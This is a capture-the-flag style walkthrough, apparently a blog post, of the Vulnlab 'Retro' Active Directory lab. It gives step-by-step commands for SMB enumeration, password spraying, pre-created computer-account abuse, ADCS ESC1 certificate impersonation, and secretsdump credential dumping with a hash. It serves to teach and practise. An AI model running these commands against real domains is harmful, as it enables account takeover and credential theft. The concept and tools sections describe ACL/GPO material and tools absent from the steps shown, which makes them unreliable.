## Introduction

Welcome back to my Active Directory exploitation series from Vulnlab! In the previous post, we tackled `Baby2`, where we explored `ACL` abuse and `GPO` misconfigurations for privilege escalation within a Windows AD environment.

Today, we're diving into the next lab in the series `Retro`.

`Retro` is a solo, junior-level Windows Active Directory machine that introduces new attack paths involving `Pre-created Computer Accounts` and the powerful, often-overlooked `Active Directory Certificate Services (ADCS)`.

These two components are common in enterprise environments, and misconfigurations here can open doors to full domain compromise â€” even without high initial privileges.

> By the end of this lab, youâ€™ll have hands-on experience with:
>- Enumerating and abusing pre-created machine accounts
>- Exploiting misconfigured ADCS for privilege escalation

### Understanding the Concepts
Before jumping into the exploitation phase, letâ€™s break down the two main concepts this lab focuses on `Pre-Created Computer Accounts` and `Active Directory Certificate Services (ADCS)` in a beginner-friendly way.

**Access Control Lists (ACLs)**
> An `Access Control List (ACL)` in Active Directory is essentially a set of permissions attached to an object, think of it as a list of `who can do what`. For example, imagine a shared folder in an office: 
>- Alice might have permission to read files, Bob can edit them, and Charlie has full control, including read, write, and delete access. 
>- Similarly, in Active Directory, ACLs define who can access, modify, or take control of objects like user accounts, groups, or computers. 
{: .prompt-tip }

**Group Policy Objects (GPOs)**
> `GPOs` are a way for administrators to automate system settings across all machines in a domain sort of like pushing rules or configurations to every computer.Example: Enforcing a password policy (e.g., must be 12 characters long), Running a startup script on all domain-joined PCs, Disabling USB drives across the organization.
{: .prompt-tip }

> A `startup script` is a script (usually a batch file, PowerShell script, or executable) that runs automatically when a computer starts up, before any user logs in. In the context of Windows Active Directory, startup scripts are often deployed using `Group Policy Objects (GPOs)` to enforce system-wide behavior across multiple machines.Letâ€™s say an IT admin wants every company laptop to Map a network drive, Install software updates, Run a security scan.
{: .prompt-tip }

>`GPOs` are powerful â€” but if misconfigured, they can be exploited. For instance, if a user or group has write access to a `GPO` that applies to an admin's machine, the attacker can inject a malicious script or command that runs with higher privileges.
{: .prompt-tip }

>Now that we have a clear understanding of what `ACLs` and `GPOs` are and why misconfigurations in these areas can pose serious security risks letâ€™s dive into the lab and start the enumeration and exploitation process step by step.

### Tools Breakdown
> NetExec(nxc): network execution tool for interacting with various services remotely, supporting protocols like VNC, SSH, WINRM, MSSQL, FTP, LDAP, RDP, WMI, NFS, SMB. It allows for remote code execution and service interaction using valid credentials across different network protocols.
{: .prompt-tip }

> SMBclient: command-line client for accessing shared folders and files over the SMB protocol. It was used to interact with shared folders on the target machine, gather information about the logon script, and later upload a modified version to establish a reverse shell.
{: .prompt-tip }

> BloodHound: is a tool for Active Directory enumeration that maps out attack paths and privilege escalation opportunities in AD environments.
{: .prompt-tip }

> PowerView: is a PowerShell tool used for Active Directory enumeration and exploitation. It allows attackers to gather information about AD domains, manipulate permissions, and escalate privileges. In this lab, PowerView was used to manipulate DACLs (Discretionary Access Control Lists) and change the password of the gpoadm account.
{: .prompt-tip }

> pyGPOAbuse: is a Python script used to abuse misconfigured Group Policy Objects (GPOs). In this lab, it was used to add the gpoadm user to the local administrators group, giving us elevated privileges.
{: .prompt-tip }

> Impacket Secretsdump:  tool from the Impacket suite that is used to dump credentials, hashes, and other sensitive information from Windows machines.
{: .prompt-tip }

> Evil-WinRM: A tool to remotely access Windows machines via WinRM using valid credentials for shell access.

## Enumeration

### SMB

Guest access

```powershell
nxc smb 10.10.79.94 -u 'Guest' -p '' --shares
```

![alt text](/assets/screenshots/Retro/1.png)

Access share with read permission

![alt text](/assets/screenshots/Retro/2.png)

users enumeration

```powershell
kerbrute userenum  -d retro.vl  --dc 10.10.79.94  -t 100 wordlists/userslist.txt
```

![alt text](/assets/screenshots/Retro/3.png)

got a hit using netxec username as password

```powershell
nxc smb 10.10.79.94 -u loots/users.txt -p loots/users.txt  --no-bruteforce --continue-on-success
```

![alt text](/assets/screenshots/Retro/4.png)

Enumerating users

```powershell
nxc smb 10.10.79.94 -u trainee -p trainee --users
```

![alt text](/assets/screenshots/Retro/5.png)

After having a list of users we could have trained AS-REP Roasting and Kerberoasting but both of dindt work here

Kerberoasting

```powershell
GetUserSPNs.py -dc-ip 192.168.1.241  retro.vl/trainee:trainee  -request
```

AS-REP Roasting

```powershell
GetNPUsers.py retro.vl/trainee:trainee -usersfile loots/users.txt  -dc-ip 10.10.79.94
```

![alt text](/assets/screenshots/Retro/6.png)

Enumerating Shares

```powershell
nxc smb 10.10.79.94 -u trainee -p trainee --shares
```

![alt text](/assets/screenshots/Retro/7.png)

Hinting about pre created computer account

```powershell
smbclient -U trainee //10.10.79.94/Notes
```

![alt text](/assets/screenshots/Retro/8.png)

Abusing Weak AD Permision Pre2K Compatibility

Using netexec

```powershell
nxc ldap 10.10.79.94 -u trainee -p trainee -M pre2k
```

![alt text](/assets/screenshots/Retro/9.png)

using the ccache

```powershell
export KRB5CCNAME=loots/tickets/banking.ccache
```

![alt text](/assets/screenshots/Retro/10.png)

Confirm

```powershell
nxc smb 10.10.79.94 --use-kcache
```

![alt text](/assets/screenshots/Retro/11.png)

Also Changing Password

```powershell
nxc smb 10.10.79.94 -u "BANKING$" -p banking
```

![alt text](/assets/screenshots/Retro/12.png)

change

```powershell
changepasswd.py retro.vl/BANKING\$@10.10.79.94 -newpass 'Password123!' -p rpc-samr
```

![alt text](/assets/screenshots/Retro/13.png)

Confirm

```powershell
nxc smb 10.10.79.94 -u "BANKING$" -p 'Password123!'
```

![alt text](/assets/screenshots/Retro/14.png)

ADCS

```powershell
nxc ldap 10.10.79.94 --use-kcache -M adcs
```

![alt text](/assets/screenshots/Retro/15.png)

Using Certipy

```powershell
certipy find -u 'BANKING$' -p 'Password123!' -dc-ip "10.10.79.94" -debug
```

![alt text](/assets/screenshots/Retro/16.png)

Find Vulnerable Templates

```powershell
certipy find -u 'BANKING$' -p 'Password123!' -dc-ip "10.10.79.94" -stdout -vulnerable
```

![alt text](/assets/screenshots/Retro/17.png)

![alt text](/assets/screenshots/Retro/18.png)

## Initial access

Exploting ESC1

```powershell
certipy req -u 'BANKING$' -p 'Password123!' -dc-ip '10.10.79.94' -ca 'retro-DC-CA' -template 'RetroClients' -dns 'DC.retro.vl' -key-size 4096 -debug
```

![alt text](/assets/screenshots/Retro/19.png)

![alt text](/assets/screenshots/Retro/20.png)

Confirm

```powershell
nxc smb 10.10.79.94 -u 'DC$' -H 532f3be569a64881ec82f1cc875059e3
```

![alt text](/assets/screenshots/Retro/22.png)

or we can request directly administartor

```powershell
certipy req -u 'BANKING$' -p 'Password123!' -dc-ip '10.10.73.65' -ca 'retro-DC-CA' -template 'RetroClients' -dns 'DC.retro.vl' -key-size 4096 -upn 'administrator@retro.vl'
```

## Privilege Escalation

dumped the secrets

```powershell
secretsdump.py retro.vl/'DC$'@10.10.79.94 -hashes aad3b435b51404eeaad3b435b51404ee:532f3be569a64881ec82f1cc875059e3
```
